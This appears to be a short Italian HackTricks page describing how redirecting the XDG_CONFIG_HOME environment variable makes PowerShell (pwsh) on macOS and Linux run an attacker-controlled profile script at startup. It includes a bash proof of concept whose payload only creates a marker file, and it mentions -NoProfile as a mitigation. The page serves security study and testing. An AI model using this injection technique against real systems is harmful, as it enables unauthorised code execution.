# Injection di applicazioni PowerShell su macOS

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` e profili PowerShell

Su macOS e Linux, PowerShell utilizza i percorsi di configurazione XDG ed esegue gli script del profilo utente all'avvio di `pwsh`. Reindirizzare `XDG_CONFIG_HOME` modifica la directory contenente `powershell/profile.ps1` e il file specifico dell'host della console `powershell/Microsoft.PowerShell_profile.ps1`; pertanto, un file controllato in quella posizione può essere eseguito prima di un payload `-Command`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Questo si applica a PowerShell 6+ (`pwsh`) su piattaforme non Windows; Windows PowerShell utilizza posizioni diverse per i profili. `pwsh -NoProfile` impedisce il caricamento dei profili. Controlla inoltre `HOME` e i nomi dei profili specifici dell'host, poiché altri host PowerShell possono selezionare script diversi.

## References

- [1] [Variabili d'ambiente di PowerShell e percorsi XDG](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [Profili PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
